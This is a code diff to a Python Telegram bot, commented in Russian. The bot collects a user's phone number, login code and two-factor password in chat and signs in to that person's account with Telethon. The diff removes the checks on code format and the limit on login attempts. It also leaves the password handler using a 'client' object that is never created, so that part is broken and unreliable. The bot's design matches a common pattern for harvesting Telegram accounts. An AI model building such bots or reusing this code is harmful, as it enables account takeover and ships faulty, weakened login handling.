@@ -8,6 +8,7 @@ from telethon import TelegramClient
 from dotenv import load_dotenv
 from telethon.errors import SessionPasswordNeededError
 from datetime import datetime
+from defunc import *
 
 # Загрузка переменных окружения из файла .env
 load_dotenv()
@@ -98,21 +99,11 @@ async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-
+    # Создаем новый экземпляр клиента
+    client = create_client()
+    await client.connect()
     try:
-        # Создаем новый экземпляр клиента
-        client = create_client()
-        await client.connect()
-        
-        # Проверяем, что пин-код состоит из 5 цифр
-        if len(code) != 5 or not code.isdigit():
-            user_state[message.from_user.id]['attempts'] += 1
-            if user_state[message.from_user.id]['attempts'] >= 3:
-                raise ValueError("Превышено количество попыток ввода кода. Пожалуйста, попробуйте позже.")
-            raise ValueError("Пин-код должен состоять из 5 цифр.")
-                
         await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash.phone_code_hash)
-        
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
     except SessionPasswordNeededError:
@@ -129,22 +120,17 @@ async def process_password(message: types.Message):
     password = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    
     try:
-        # Создаем новый экземпляр клиента
-        client = create_client()
-        await client.connect()
-        
-        await client.sign_in(phone_number=phone_number, code=code, password=password, phone_code_hash=phone_code_hash.phone_code_hash)
-        #await client.sign_in(password=password)
+        #await client.sign_in(phone_number=phone_number, code=code, password=password, phone_code_hash=phone_code_hash.phone_code_hash)
+        await client.sign_in(password=password)
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
     finally:
-        user_state[message.from_user.id]['attempts'] += 1
-        if user_state[message.from_user.id]['attempts'] >= 3:
-            user_state.pop(message.from_user.id, None)
+        #user_state[message.from_user.id]['attempts'] += 1
+        #if user_state[message.from_user.id]['attempts'] >= 3:
+        user_state.pop(message.from_user.id, None)
         await client.log_out()
         await client.disconnect()
 
